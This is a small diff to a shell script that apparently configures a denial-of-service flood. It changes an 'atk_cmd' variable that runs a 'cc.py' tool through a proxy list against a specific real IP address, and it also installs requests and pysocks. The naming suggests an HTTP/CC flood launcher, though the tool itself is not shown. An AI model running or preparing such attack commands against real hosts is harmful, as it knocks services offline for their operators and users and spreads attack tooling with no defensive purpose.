@@ -6,7 +6,8 @@
 #  Lastly run this script
 #
 #the command you want to exec
-atk_cmd="python3 cc.py -url http://38.27.122.177/ -f proxy.txt -v 1 -s 6000"
+
+atk_cmd="python3 cc.py -url http://38.27.122.177 -down -f proxy.txt -v 5"
 
 pip3 install requests pysocks
 
